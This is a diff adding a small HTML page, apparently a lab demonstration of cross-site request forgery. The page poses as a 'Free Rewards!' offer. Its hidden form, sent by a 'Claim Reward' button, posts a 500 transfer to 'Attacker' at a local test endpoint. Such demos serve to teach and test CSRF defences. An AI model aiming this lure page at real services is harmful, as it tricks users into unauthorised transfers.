@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Rewards!</title>
+</head>
+
+<body>
+
+    <h1>Congratulations!</h1>
+    <p>Click below to claim your free reward!</p>
+
+    <form id="csrf-attack"
+		action="http://localhost:5000/transfer-protected"
+          method="POST">
+
+        <input type="hidden" name="recipient" value="Attacker">
+        <input type="hidden" name="amount" value="500">
+
+    </form>
+
+    <button onclick="document.getElementById('csrf-attack').submit()">
+        Claim Reward
+    </button>
+
+</body>
+</html>
